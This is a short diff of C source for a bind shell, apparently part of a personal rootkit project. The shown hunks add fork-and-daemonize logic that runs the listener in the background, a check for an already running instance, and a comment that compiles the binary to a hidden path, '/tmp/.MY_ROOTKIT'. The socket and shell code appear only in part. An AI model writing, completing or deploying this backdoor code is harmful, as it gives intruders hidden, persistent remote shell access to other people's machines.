@@ -16,14 +16,14 @@ int if_running(){
         return 1;
     }
     else {
-        
+
         return 0;
     }
 }
 
 //create socket object
 void create(){
-    if(if_running()){
+    if(if_running() == 1){
         #ifdef DEBUG
             fprintf(stderr,"Bind shell already running \n");
         #endif
@@ -32,12 +32,14 @@ void create(){
 
     int sockfd,newsock_fd,status;
 
+    //handle multiple processes with fork
     pid_t pid =fork();
     if(pid < 0){
         fprintf(stderr,"ERROR in forking process ");
         exit(EXIT_FAILURE);
     }
     if(pid == 0){
+        //background process with daemon
         daemon(0,1);
         struct sockaddr_in socket_config;
         socket_config.sin_family =AF_INET;
@@ -83,4 +85,7 @@ void create(){
 since there is no hooking being done here i can try compiling this to be a separate 
 executable file and this is what will run in the background  only way i can think of to make it 
 intresting at least well until we enter the debugging phase
+
+gcc bind_shell.c -o /tmp/.MY_ROOTKIT 
+comiple to this path
 */
